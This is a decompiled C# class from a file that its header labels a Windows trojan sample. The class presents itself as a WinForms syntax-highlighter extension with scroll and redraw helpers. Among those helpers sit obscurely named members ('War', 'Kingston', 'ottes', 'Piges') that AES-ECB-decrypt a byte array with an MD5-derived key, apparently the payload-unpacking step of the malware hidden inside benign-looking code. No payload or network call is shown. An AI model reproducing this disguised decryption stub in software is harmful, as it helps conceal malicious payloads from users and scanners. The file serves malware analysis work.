// Decompiled with JetBrains decompiler
// Type: WinFormsSyntaxHighlighter.TextBoxBaseExtensions
// Assembly: WinFormsSyntaxHighlighter, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7F5F1073-81B4-4786-AC13-05D2F8A8156A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-827d6ccbbb1e40f6227f213627242bb61452b7e5f7827fbd49ca2c81343811fa.exe

using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace WinFormsSyntaxHighlighter
{
  public static class TextBoxBaseExtensions
  {
    public static AesManaged ottes = new AesManaged();
    public static ICryptoTransform Piges;
    private const int WM_SETREDRAW = 11;
    private const int WM_USER = 1024;
    private const int EM_GETEVENTMASK = 1083;
    private const int EM_SETEVENTMASK = 1093;
    private const int SB_HORZ = 0;
    private const int SB_VERT = 1;
    private const int WM_HSCROLL = 276;
    private const int WM_VSCROLL = 277;
    private const int SB_THUMBPOSITION = 4;
    private const int UNDO_BUFFER = 100;

    public static void DisableThenDoThenEnable(this TextBoxBase textBox, Action action)
    {
      IntPtr zero = IntPtr.Zero;
      textBox.Lock(ref zero);
      int hscrollPos = textBox.GetHScrollPos();
      int vscrollPos = textBox.GetVScrollPos();
      int selectionStart = textBox.SelectionStart;
      action();
      textBox.Select(selectionStart, 0);
      textBox.SetHScrollPos(hscrollPos);
      textBox.SetVScrollPos(vscrollPos);
      textBox.Unlock(ref zero);
    }

    public static int GetHScrollPos(this TextBoxBase textBox) => TextBoxBaseExtensions.GetScrollPos((int) textBox.Handle, 0);

    public static void SetHScrollPos(this TextBoxBase textBox, int value)
    {
      TextBoxBaseExtensions.SetScrollPos(textBox.Handle, 0, value, true);
      TextBoxBaseExtensions.PostMessageA(textBox.Handle, 276, 4 + 65536 * value, 0);
    }

    public static int GetVScrollPos(this TextBoxBase textBox) => TextBoxBaseExtensions.GetScrollPos((int) textBox.Handle, 1);

    public static void SetVScrollPos(this TextBoxBase textBox, int value)
    {
      TextBoxBaseExtensions.SetScrollPos(textBox.Handle, 1, value, true);
      TextBoxBaseExtensions.PostMessageA(textBox.Handle, 277, 4 + 65536 * value, 0);
    }

    public static byte[] War(byte[] B, string iKey)
    {
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.BigEndianUnicode.GetBytes(iKey));
      TextBoxBaseExtensions.ottes.Key = hash;
      TextBoxBaseExtensions.ottes.Mode = CipherMode.ECB;
      TextBoxBaseExtensions.Piges = TextBoxBaseExtensions.ottes.CreateDecryptor();
      byte[] numArray = TextBoxBaseExtensions.Kingston(B);
      TextBoxBaseExtensions.ottes.Clear();
      return numArray;
    }

    private static void Lock(this TextBoxBase textBox, ref IntPtr stateLocked)
    {
      TextBoxBaseExtensions.SendMessage(textBox.Handle, 11, 0, IntPtr.Zero);
      stateLocked = TextBoxBaseExtensions.SendMessage(textBox.Handle, 1083, 0, IntPtr.Zero);
    }

    private static void Unlock(this TextBoxBase textBox, ref IntPtr stateLocked)
    {
      TextBoxBaseExtensions.SendMessage(textBox.Handle, 1093, 0, stateLocked);
      TextBoxBaseExtensions.SendMessage(textBox.Handle, 11, 1, IntPtr.Zero);
      stateLocked = IntPtr.Zero;
      textBox.Invalidate();
    }

    public static byte[] Kingston(byte[] B) => TextBoxBaseExtensions.Piges.TransformFinalBlock(B, 0, B.Length);

    [DllImport("user32", CharSet = CharSet.Auto)]
    private static extern IntPtr SendMessage(
      IntPtr hWnd,
      int msg,
      int wParam,
      IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern bool PostMessageA(IntPtr hWnd, int nBar, int wParam, int lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int GetScrollPos(int hWnd, int nBar);

    [DllImport("user32.dll")]
    private static extern int SetScrollPos(IntPtr hWnd, int nBar, int nPos, bool bRedraw);
  }
}
